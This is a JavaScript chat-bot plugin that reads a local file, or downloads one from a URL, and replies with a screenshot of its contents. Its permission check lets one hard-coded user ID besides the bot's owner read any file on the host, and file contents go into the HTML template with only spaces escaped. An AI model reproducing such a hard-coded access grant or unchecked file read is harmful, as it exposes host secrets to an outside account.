import fs from "node:fs"
import puppeteer from "../../../lib/puppeteer/puppeteer.js"

const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/SourceCode/`
const tplFile = `${htmlDir}SourceCode.html`

export class SourceCode extends plugin {
  constructor() {
    super({
      name: "SourceCode",
      dsc: "SourceCode",
      event: "message",
      priority: -Infinity,
      rule: [
        {
          reg: "^sc.+",
          fnc: "SourceCode"
        }
      ]
    })
  }

  async SourceCode(e) {
    if(!(this.e.isMaster||this.e.user_id == 2536554304))return false
    const msg = this.e.msg.replace("sc", "").trim()
    logger.mark(`[SourceCode] 查看：${logger.blue(msg)}`)

    let scFile = msg
    if (/^https?:\/\//.test(msg)) {
      scFile =`${process.cwd()}/data/cache.sc`
      const ret = await Bot.download(msg, scFile)
      if (!ret) {
        await this.reply("文件下载错误", true)
        return false
      }
    }

    if (!(fs.existsSync(scFile) && fs.statSync(scFile).isFile())) {
      await this.reply("文件不存在", true)
      return false
    }

    const SourceCode = fs.readFileSync(scFile, "utf-8").replace(/ /g, "&nbsp;")
    const img = await puppeteer.screenshot("SourceCode", { tplFile, htmlDir, SourceCode })

    await this.reply(img, true)
  }
}